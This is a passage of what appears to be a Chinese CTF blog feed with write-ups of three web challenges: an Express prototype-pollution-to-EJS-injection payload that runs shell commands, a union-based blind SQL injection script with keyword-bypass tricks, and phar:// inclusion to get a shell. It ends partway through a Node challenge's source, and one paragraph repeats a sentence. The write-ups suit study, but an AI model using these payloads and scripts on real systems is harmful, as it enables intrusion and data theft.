   <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">safeKeyword</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>userid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"&lt;script>alert('forbid word');history.go(-1);&lt;/script>"</span><span class="token punctuation">)</span> 
   <span class="token punctuation">}</span>
    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token operator">=</span><span class="token punctuation">{</span>
      <span class="token string">'user'</span><span class="token punctuation">:</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>userid<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
      <span class="token string">'passwd'</span><span class="token punctuation">:</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>pwd<span class="token punctuation">,</span>
      <span class="token string">'isLogin'</span><span class="token punctuation">:</span><span class="token boolean">false</span>
    <span class="token punctuation">}</span>
    res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>Submit<span class="token operator">==</span><span class="token string">"login"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">)</span><span class="token punctuation">{</span>res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"&lt;script>alert('register first');history.go(-1);&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">}</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">.</span>user<span class="token operator">==</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>userid<span class="token operator">&amp;&amp;</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>pwd<span class="token operator">==</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">.</span>passwd<span class="token punctuation">)</span><span class="token punctuation">{</span>
      req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">.</span>isLogin<span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span><span class="token punctuation">{</span>
      res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"&lt;script>alert('error passwd');history.go(-1);&lt;/script>"</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
  
  <span class="token punctuation">}</span>
  res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/action'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">.</span>user<span class="token operator">!=</span><span class="token string">"ADMIN"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"&lt;script>alert('ADMIN is asked');history.go(-1);&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">}</span> 
  req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">.</span>data <span class="token operator">=</span> <span class="token function">clone</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>
  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"&lt;script>alert('success');history.go(-1);&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
router<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/info'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span>data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'user'</span><span class="token punctuation">:</span>res<span class="token punctuation">.</span>outputFunctionName<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span>
</code></pre>
<p>上来就自己定义了一个clone函数，怎么看怎么原型链污染，题目意图非常明显，而看到login，首先不允许你是admin，又需要你用admin登录，没找到源码的时候题目有说只支持大写用户名就能猜到是怎么回事了，用一个奇怪的字符绕过一下就好</p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>用特殊字符绕过当做admin登录进去<br>admin登录进去之后，这里action路由调用clone函数，超级明显原型链污染，然后info路由又调用一个不存在的outputFunctionName属性，但是还是看不出来该怎么利用，搜出来的payload基本上都是如下形式<br><code>&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;: &quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;cat /flag &gt; /app/public/flag&#39;);var _tmp2&quot;&#125;&#125;</code></p>
<p>outputFunctionName前面拼起来了一个_tmp1，看起来像是闭合一个var一样，而就算我把object中添加一个这样的属性，就能自动调用函数了吗？显然不行，但是关于这个题的wp都没有说到这个payload是怎么一回事，几经周折才知道这个点的原型是Xnuca2019中的一道hardjs，返回使用的模板渲染函数res.render()存在SSTI，而其中存在这样一段代码</p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">...</span><span class="token operator">...</span>
      prepended <span class="token operator">+</span><span class="token operator">=</span> <span class="token string">'  var __output = [], __append = __output.push.bind(__output);'</span> <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>opts<span class="token punctuation">.</span>outputFunctionName<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        prepended <span class="token operator">+</span><span class="token operator">=</span> <span class="token string">'  var '</span> <span class="token operator">+</span> opts<span class="token punctuation">.</span>outputFunctionName <span class="token operator">+</span> <span class="token string">' = __append;'</span> <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>opts<span class="token punctuation">.</span>_with <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        prepended <span class="token operator">+</span><span class="token operator">=</span>  <span class="token string">'  with ('</span> <span class="token operator">+</span> opts<span class="token punctuation">.</span>localsName <span class="token operator">+</span> <span class="token string">' || {}) {'</span> <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">;</span>
        appended <span class="token operator">+</span><span class="token operator">=</span> <span class="token string">'  }'</span> <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
<span class="token operator">...</span><span class="token operator">...</span>
</code></pre>
<p>将opts.outputFunctionName拼接到了语句中，而上下文并未出现outputFunctionName这个属性，因此通过污染原型链来在此处进行SSTI，拼接的前面有一个var，而后面有一个__append，这就是payload前后拼接了奇怪内容的原因</p>
<p>所以render函数那里传入的那个outputFunctionName的参数其实并无意义，可能只是为了提示老赛棍是这个js的模板注入吧（可惜我完全不知道这回事）<br>express的SSTI可以看之前XNUCA的wp<br><a href="https://www.jianshu.com/p/8e8da988894f">https://www.jianshu.com/p/8e8da988894f</a></p>
<h3 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h3><p>自己试的时候用α代替a试了一下发现登录进去用户名的确是ADMIN，但是事实上又不是admin，在console里面试了一下α转换成大写之后虽然看起来和A一模一样但是就是不是一个东西。。。<br>最后还是用的先知的js中toUppercase里面的特殊字符ı替代了i登录进去的</p>
<p>content-type一定要记得写成application&#x2F;json….我之前application少打一个p试了半天打不动不知道怎么回事<br>访问info可以看到自己打进去的outputFunctionName的值，但是并不会显示执行结果，想弹shell半天没成功，估计是buu后来全部靶机都不能访问外网了吧，最后看的大佬wp，输入不存在路由通过报错找到绝对路径，然后把flag写入public静态目录下面，访问直接&#x2F;flag下载下来</p>
<p>像python，JavaScript这类通过路由设置服务的方式和PHP访问对应文件就有一定的区别，设置了路由的情况下，就不会出现部分文件暴露在网站根目录被访问的情况，像PHP的话可以直接把flag写到网站根目录里面去直接访问获得，不过，他们也有对应的静态目录，静态目录下的文件就可以被直接访问，源码中app.js设置了静态目录<code>app.use(express.static(path.join(\_\_dirname, &#39;public&#39;)));</code>这个设置直接在静态目录下查找文件，因此访问时无需在url中添加public目录<br>所以public下的内容可以被直接访问，通过把flag写到静态目录下也可以直接访问获得</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>原型链污染</tag>
        <tag>ssti</tag>
      </tags>
  </entry>
  <entry>
    <title>HBCTF 大美西安</title>
    <url>/%5BHBCTF%5D%E5%A4%A7%E7%BE%8E%E8%A5%BF%E5%AE%89.html</url>
    <content><![CDATA[<h1 id="HBCTF-大美西安"><a href="#HBCTF-大美西安" class="headerlink" title="[HBCTF]大美西安"></a>[HBCTF]大美西安</h1><p>本来看这个河北CTF的名字还以为是个水题，但是还是有难度的，学到了一点新知识</p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><h3 id="获取源码"><a href="#获取源码" class="headerlink" title="获取源码"></a>获取源码</h3><p>点开是一个登录界面，看源码可以发现register.php的注释，成功注册登录而url上又有file&#x3D;home的内容，估摸着是文件包含，伪协议直接读一波，发现回显禁止，这样子基本就确定了是文件包含的思路，但是源码怎么获得呢</p>
<p>登录之后页面一个上传一个下载，上传的文件不给路径，之后在下载界面显示一个id，而下载界面则是通过id查数据库进行下载，这样子就没机会跳目录进行任意文件下载了</p>
<p>既然文件能下载，那么数据库应该就是存了文件路径，通过查询返回路径进行下载。既然是查数据库就存在注入，当务之急是获取一下源码，那如果查询结果是源码路径，那不就能获取源码了？</p>
<p>但是这个注入还有过滤，并且怎么注都没有回显，很坑，最后看wp发现是关键字替换为空（就算我知道是关键字替换我还不知道是哪些被替换了，着实坑爹），双写绕过，拿到一堆源码，可以看见过滤是怎么过滤的了</p>
<h3 id="坑点1"><a href="#坑点1" class="headerlink" title="坑点1"></a>坑点1</h3><p>这里注入的时候本来想直接用引号包裹文件名获取，还是不行，后来看wp用0x十六进制数来获取的源码，看到源码之后发现在index.php的开头调用了一个自定义的转义函数，把引号什么的进行了转义，但是这个转义好像转的直接不能正常运行了，理论上转义也只是把引号变成引号字符才对</p>
<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>文件包含被添加了固定的.php后缀，并且限制了.. php: 的伪协议和空白字符（不知道空白字符有什么用）<br>对于限制特定后缀的文件包含可以使用phar:&#x2F;&#x2F;协议或者zip:&#x2F;&#x2F;协议绕过，将后缀为.php的文件打包上传，这样子包含自己的打包文件中的php文件即可绕过<br><a href="https://bl4ck.in/tricks/2015/06/10/zip%E6%88%96phar%E5%8D%8F%E8%AE%AE%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6.html">https://bl4ck.in/tricks/2015/06/10/zip%E6%88%96phar%E5%8D%8F%E8%AE%AE%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6.html</a></p>
<h3 id="union盲注"><a href="#union盲注" class="headerlink" title="union盲注"></a>union盲注</h3><p>全新的知识点<br>但是这次的文件上传没有返回文件名，从源码中可以看到文件名被替换为了一个32位随机字符串，这样子硬撞是没希望了，所以我们就要看怎么通过注入来获取文件名<br>这里注入没有报错，只有一个查询不到结果时的回显和查询的结果文件不存在的回显<br>再看注入的过滤，这里把括号()给替换为空了，就等于不能使用函数，还有一些其他的符号也不能使用，这样子bool盲注时间盲注都没机会了<br>union查询会返回union查询的结果，按照常规顺序的话返回的行按查询顺序排序，如果使用order by，则会以ascii码顺序进行排序，比如这里我们使用<code>select location from download where id=2 union select 0xxxxxx order by 1</code>（使用十六进制表示是因为引号用了会出问题）<br>这样的语句，那么如果我后面的这个0xxxxx的字符串ascii码小于前面语句查询出来的结果，order by就会把union查询的结果作为第一行返回，我令ascii码递增，当我的ascii码大于前面的查询时，就会查询出正确结果，那么就可知上一次查询的结果应当与真实结果相匹配，这样子就可以一位位的试出来内容<br>注入原理如下</p>
<pre class=" language-mysql"><code class="language-mysql">mysql> select username from users where id=1 union select 'Da' order by 1;
+----------+
| username |
+----------+
| Da       |
| Dumb     |
+----------+
2 rows in set (0.00 sec)

mysql> select username from users where id=1 union select 'Dz' order by 1;
+----------+
| username |
+----------+
| Dumb     |
| Dz       |
+----------+
2 rows in set (0.00 sec)
</code></pre>
<p>写一个脚本</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests


<span class="token keyword">def</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">:</span>
    result <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> string<span class="token punctuation">:</span>
        result <span class="token operator">+=</span> hex<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
    <span class="token keyword">return</span> result


str_pool <span class="token operator">=</span> <span class="token string">"123456789abcdefghijklmnopqrstuvwxyz{"</span>   <span class="token comment" spellcheck="true"># z后面的字符ascii码值要比z大，不然z下一步又遇到一个小的就无法判断了</span>
url <span class="token operator">=</span> <span class="token string">"http://0f8def7f-c0bd-4db5-a818-bcaae8ee52a8.node3.buuoj.cn/downfile.php"</span>
file_name <span class="token operator">=</span> <span class="token string">"./Up10aDs/"</span>
headers <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">,</span>
    <span class="token string">"Cookie"</span><span class="token punctuation">:</span>  <span class="token string">"_ga=GA1.2.231385534.1582877428; PHPSESSID=ei99gqi0lpr7lrsn8ihsquki12"</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span>
payload <span class="token operator">=</span> <span class="token string">"image=3 uniunionon seleselectct 0x{0} oorrder by 1&amp;image_download=%E6%94%B6%E8%97%8F"</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]filename:"</span> <span class="token operator">+</span> file_name<span class="token punctuation">)</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>str_pool<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        tmp_name <span class="token operator">=</span> file_name <span class="token operator">+</span> str_pool<span class="token punctuation">[</span>j<span class="token punctuation">]</span>
        data <span class="token operator">=</span> payload<span class="token punctuation">.</span>format<span class="token punctuation">(</span>bin2hex<span class="token punctuation">(</span>tmp_name<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token comment" spellcheck="true"># print(data)</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
        <span class="token comment" spellcheck="true"># print(r.text)</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">404</span><span class="token punctuation">)</span> <span class="token operator">or</span> <span class="token punctuation">(</span>r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">529</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">"file may be deleted"</span> <span class="token operator">not</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            file_name <span class="token operator">+=</span> str_pool<span class="token punctuation">[</span>j<span class="token number">-1</span><span class="token punctuation">]</span>
            <span class="token keyword">break</span>
</code></pre>
<p>这里源码中产生的随机字符串只要0-9a-z，所以字符池中也只有这么多位</p>
<p>最后我创建了一个1.phar改名成1.png上传，里面打包了一个z3ratu1.php，最后查到路径进行包含，phar:&#x2F;&#x2F;Up10aDs&#x2F;path.png&#x2F;z3ratu1 这样子就会把后面的后缀补齐，再用phar协议解压缩成功包含了<br><a href="http://wonderkun.cc/2017/02/26/%E5%9F%BA%E4%BA%8Eunion%E6%9F%A5%E8%AF%A2%E7%9A%84%E7%9B%B2%E6%B3%A8(%E6%84%9F%E8%B0%A2pcat%E7%89%9B%E4%B8%8D%E5%90%9D%E8%B5%90%E6%95%99)/">http://wonderkun.cc/2017/02/26/%E5%9F%BA%E4%BA%8Eunion%E6%9F%A5%E8%AF%A2%E7%9A%84%E7%9B%B2%E6%B3%A8(%E6%84%9F%E8%B0%A2pcat%E7%89%9B%E4%B8%8D%E5%90%9D%E8%B5%90%E6%95%99)/</a></p>
<h3 id="小坑"><a href="#小坑" class="headerlink" title="小坑"></a>小坑</h3><p>写到最后又忘了之前他给了一个引号的转义，最后getshell的时候执行phpinfo没什么问题，但是想执行函数带了几个引号就没反应了，我还以为有什么奇奇怪怪的问题，最后还是马师傅厉害，几分钟就测出来结果了，事实上执行函数不带引号问题也不大，大部分就报个警告然后当成字符串执行了<br>所以出了问题还是要思考是不是环境有过滤嘛后还是马师傅厉害，几分钟就测出来结果了，事实上执行函数不带引号问题也不大，大部分就报个警告然后当成字符串执行了<br>所以出了问题还是要思考是不是环境有过滤嘛</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>SQLI</tag>
        <tag>文件包含</tag>
        <tag>phar</tag>
      </tags>
  </entry>
  <entry>
    <title>[GYCTF2020]Node Game</title>
    <url>/%5BGYCTF2020%5Dnode%20game.html</url>
    <content><![CDATA[<h1 id="GYCTF2020-Node-Game"><a href="#GYCTF2020-Node-Game" class="headerlink" title="[GYCTF2020]Node Game"></a>[GYCTF2020]Node Game</h1><p>最近把JavaScript入了一下门，就顺便做了个js题目</p>
<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><pre class=" language-javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> action <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>action <span class="token operator">?</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>action <span class="token punctuation">:</span> <span class="token string">"index"</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span> action<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span> <span class="token operator">||</span> action<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">"\\"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>
        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"Errrrr, You have been Blocked"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">let</span> file <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname <span class="token operator">+</span> <span class="token string">'/template/'</span> <span class="token operator">+</span> action <span class="token operator">+</span> <span class="token string">'.pug'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> html <span class="token operator">=</span> pug<span class="token punctuation">.</span><span class="token function">renderFile</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span>
    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/file_upload'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">const</span> ip <span class="token operator">=</span> req<span class="token punctuation">.</span>connection<span class="token punctuation">.</span>remoteAddress<span class="token punctuation">;</span>
    <span class="token keyword">let</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>
        msg<span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>ip<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        obj<span class="token punctuation">.</span>msg<span class="token operator">=</span><span class="token string">"only admin's ip can use it"</span>
        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span>
    <span class="token punctuation">}</span>
    fs<span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>path<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>err<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">{</span>
            obj<span class="token punctuation">.</span>msg <span class="token operator">=</span> <span class="token string">'upload failed'</span><span class="token punctuation">;</span>
            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
            <span class="token keyword">const</span> file_path <span class="token operator">=</span> <span class="token string">'/uploads/'</span> <span class="token operator">+</span> req<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>mimetype <span class="token operator">+</span> <span class="token string">"/"</span><span class="token punctuation">;</span>
            <span class="token keyword">const</span> file_name <span class="token operator">=</span> req<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>originalname<span class="token punctuation">;</span>
            <span class="token keyword">const</span> dir_file <span class="token operator">=</span> __dirname <span class="token operator">+</span> file_path <span class="token operator">+</span> file_name<span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>fs<span class="token punctuation">.</span><span class="token function">existsSync</span><span class="token punctuation">(</span>__dirname <span class="token operator">+</span> file_path<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                <span class="token keyword">try</span> <span class="token punctuation">{</span>
                    fs<span class="token punctuation">.</span><span class="token function">mkdirSync</span><span class="token punctuation">(</span>__dirname <span class="token operator">+</span> file_path<span class="token punctuation">)</span>
                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    obj<span class="token punctuation">.</span>msg <span class="token operator">=</span> <span class="token string">"file type error"</span><span class="token punctuation">;</span>
                    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">return</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                fs<span class="token punctuation">.</span><span class="token function">writeFileSync</span><span class="token punctuation">(</span>dir_file<span class="token punctuation">,</span>data<span class="token punctuation">)</span>
                obj <span class="token operator">=</span> <span class="token punctuation">{</span>
                    msg<span class="token punctuation">:</span> <span class="token string">'upload success'</span><span class="token punctuation">,</span>
                    filename<span class="token punctuation">:</span> file_path <span class="token operator">+</span> file_name
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                obj<span class="token punctuation">.</span>msg <span class="token operator">=</span> <span class="token string">'upload failed'</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>

app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/source'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname <span class="token operator">+</span> <span class="token string">'/template/source.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/core'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> q <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>q<span class="token punctuation">;</span>
    <span class="token keyword">const</span> resp <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>q<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">const</span> url <span class="token operator">=</span> <span class="token string">'http://localhost:8081/source?'</span> <span class="token operator">+</span> q<span class="token punctuation">;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>
        <span class="token keyword">const</span> trigger <span class="token operator">=</span> <span class="token function">blacklist</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>trigger <span class="token operator">===</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"&lt;p>error occurs!&lt;/p>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                http<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>resp<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    resp<span class="token punctuation">.</span><span class="token function">setEncoding</span><span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    resp<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>
